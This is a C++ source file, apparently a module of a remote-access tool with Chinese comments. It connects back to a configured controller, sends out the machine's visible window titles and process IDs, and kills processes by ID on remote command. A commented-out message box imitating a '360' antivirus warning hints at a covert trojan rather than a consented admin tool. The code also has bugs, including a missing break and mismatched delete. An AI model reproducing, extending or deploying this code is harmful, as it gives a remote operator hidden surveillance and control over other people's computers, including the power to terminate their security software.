#include "WindowManager.h"
#include "Command.h"

int bufferSize = 0;
int windowCount = 0;
bool CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	char *lpBuffer = (char *)lParam;
	LPWindowInfo lpWindowInfo = new WindowInfo;
	memset(lpWindowInfo->strTitle, 0, sizeof(lpWindowInfo->strTitle));
	GetWindowText(hwnd, lpWindowInfo->strTitle , 512);
	if (!IsWindowVisible(hwnd) || strlen(lpWindowInfo->strTitle) == 0)
	return true;
	lpWindowInfo->dwProcessID = 0;
	GetWindowThreadProcessId(hwnd, &lpWindowInfo->dwProcessID);

	memcpy(lpBuffer + bufferSize, lpWindowInfo, sizeof(WindowInfo));
	bufferSize += sizeof(WindowInfo);
	windowCount++;
    delete lpWindowInfo;
	//(char *)lParam = lpBuffer + strlen(lpBuffer);
	return true;
}


void getWindowList(SOCKET windowManagerSocket, LPMsgHead lpMsgHead){
	bufferSize = 0;
	windowCount = 0;
	char *lpBuffer = new char [1024 * 200]; 
	memset(lpBuffer, 0, 1024*200);
	EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)lpBuffer);
	lpMsgHead->dwCmd =  8888;
	lpMsgHead->dwSize = bufferSize;
	lpMsgHead->dwExtend1 = windowCount;
	SendMsg(windowManagerSocket, lpBuffer, lpMsgHead);
	delete lpBuffer;
}

bool DebugPrivilege(const char *PName,BOOL bEnable)
{
	BOOL              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;

	LookupPrivilegeValue(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (GetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}

	CloseHandle(hToken);
	return bResult;	
}

void deleteWindow(int id){
	    DebugPrivilege(SE_SHUTDOWN_NAME,TRUE);
		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
		TerminateProcess(hProcess, 0);
		CloseHandle(hProcess);
		DebugPrivilege(SE_SHUTDOWN_NAME, FALSE);
}


void windowManager(){
	struct sockaddr_in LocalAddr;
	LocalAddr.sin_family=AF_INET;
	LocalAddr.sin_port = htons(ConnectInfo::getConnectInfo()->port);
	LocalAddr.sin_addr.S_un.S_addr= inet_addr(ConnectInfo::getConnectInfo()->ipAddress);

	SOCKET windowManagerSocket = socket(AF_INET, SOCK_STREAM, 0);//重新建立一个专门的socket和客户端进行交互
	if(connect(windowManagerSocket,(PSOCKADDR)&LocalAddr,sizeof(LocalAddr)) == SOCKET_ERROR)
	{
		closesocket(windowManagerSocket);
		return ;//connect error
	}

	MsgHead msgHead;
	char *chBuffer = new char[1536 * 1024]; //数据交换区 1.5MB

	//send socket type 
	msgHead.dwCmd = CMD_WINDOW_MANAGER_DLG_SHOW;
	msgHead.dwSize = 0;
	if(!SendMsg(windowManagerSocket, chBuffer, &msgHead))
	{
		if(chBuffer != NULL)
			delete []chBuffer;

		closesocket(windowManagerSocket);
		return ;//send socket type error
	}
	bool flag = true;
	while(flag)
	{
		//接收命令
		if(!RecvMsg(windowManagerSocket, chBuffer, &msgHead))
			break;

		//解析命令
		switch(msgHead.dwCmd)
		{
		case CMD_SHOW_WINDOW_LIST:
			{
				getWindowList(windowManagerSocket, &msgHead);
			}
			break;
		case CMD_WINDOW_DELETE:
			{
				deleteWindow(msgHead.dwExtend1);
		    }
		default:
			{
				//::MessageBox(NULL,"您的360出现问题！", "您的360出现问题！", MB_OK);
			} 
			break;

		}
		memset(chBuffer, 0, 1536 * 1024);
	}
	if(chBuffer != NULL)
		delete[] chBuffer;
	closesocket(windowManagerSocket);
	return ;
}



